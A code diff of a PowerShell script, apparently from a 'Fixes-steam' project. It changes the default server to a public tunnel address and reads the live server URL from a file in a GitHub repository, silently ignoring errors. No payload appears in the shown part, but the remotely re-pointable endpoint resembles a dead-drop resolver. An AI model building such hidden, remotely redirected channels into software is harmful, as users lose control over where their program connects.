@@ -213,33 +213,25 @@ function Remove-ExpiredTimers {
     Save-Timers $remaining; return $remaining
 }
 
-# ---- Server URL (auto-fetch from GitHub) ----
-$script:serverUrl = "http://localhost:8768"
+# ---- Server URL (default + auto-fetch from raw GitHub) ----
+$script:serverUrl = "https://efe110859ebced7b-45-224-188-19.serveousercontent.com"
 function Update-ServerUrl {
     try {
-        $apiResult = Invoke-RestMethod -Uri "https://api.github.com/repos/bastisayes/Fixes-steam/contents/original_blue.ps1" -UseBasicParsing -TimeoutSec 8 -ErrorAction SilentlyContinue
-        if ($apiResult.content) {
-            $b64 = $apiResult.content -replace "`n|`r", ""
-            $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
-            if ($decoded -match '\$script:serverUrl\s*=\s*"(https?://[^"]+)"') {
-                $newUrl = $matches[1]
-                if ($newUrl -ne "https://EJEMPLO.lhr.life" -and $newUrl -ne $script:serverUrl) {
-                    $script:serverUrl = $newUrl
-                }
+        $rawContent = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/bastisayes/Fixes-steam/main/original_blue.ps1" -UseBasicParsing -TimeoutSec 8 -ErrorAction SilentlyContinue
+        if ($rawContent -match '\$script:serverUrl\s*=\s*"(https?://[^"]+)"') {
+            $newUrl = $matches[1]
+            if ($newUrl -ne "https://EJEMPLO.lhr.life" -and $newUrl -ne $script:serverUrl) {
+                $script:serverUrl = $newUrl
             }
         }
     } catch {}
 }
 # Initial fetch on startup
 try {
-    $apiResult = Invoke-RestMethod -Uri "https://api.github.com/repos/bastisayes/Fixes-steam/contents/original_blue.ps1" -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop
-    if ($apiResult.content) {
-        $b64 = $apiResult.content -replace "`n|`r", ""
-        $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
-        if ($decoded -match '\$script:serverUrl\s*=\s*"(https?://[^"]+)"') {
-            $fetchedUrl = $matches[1]
-            if ($fetchedUrl -ne "https://EJEMPLO.lhr.life") { $script:serverUrl = $fetchedUrl }
-        }
+    $rawContent = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/bastisayes/Fixes-steam/main/original_blue.ps1" -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
+    if ($rawContent -match '\$script:serverUrl\s*=\s*"(https?://[^"]+)"') {
+        $fetchedUrl = $matches[1]
+        if ($fetchedUrl -ne "https://EJEMPLO.lhr.life") { $script:serverUrl = $fetchedUrl }
     }
 } catch {}
 
